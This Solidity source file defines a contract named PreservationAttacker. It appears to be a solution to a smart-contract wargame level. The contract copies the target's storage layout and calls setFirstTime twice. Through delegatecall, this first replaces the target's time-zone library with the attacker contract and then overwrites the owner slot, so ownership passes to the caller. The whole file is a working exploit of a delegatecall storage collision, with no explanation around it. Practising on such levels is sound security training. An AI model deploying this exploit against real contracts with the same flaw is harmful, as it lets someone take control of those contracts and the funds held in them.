// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IPreservation {
    function setFirstTime(uint256 _timeStamp) external;
}

contract PreservationAttacker {
    error PreservationAttacker__InvalidAddress();

    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 public storedTime;

    IPreservation private preservation;

    constructor(address _preservation) {
        if (_preservation == address(0)) {
            revert PreservationAttacker__InvalidAddress();
        }
        preservation = IPreservation(_preservation);
    }

    function setTime(uint256 _addr) external {
        owner = address(uint160(_addr));
    }

    function attack() external {
        preservation.setFirstTime(uint256(uint160(address(this))));
        preservation.setFirstTime(uint256(uint160(msg.sender)));
    }
}
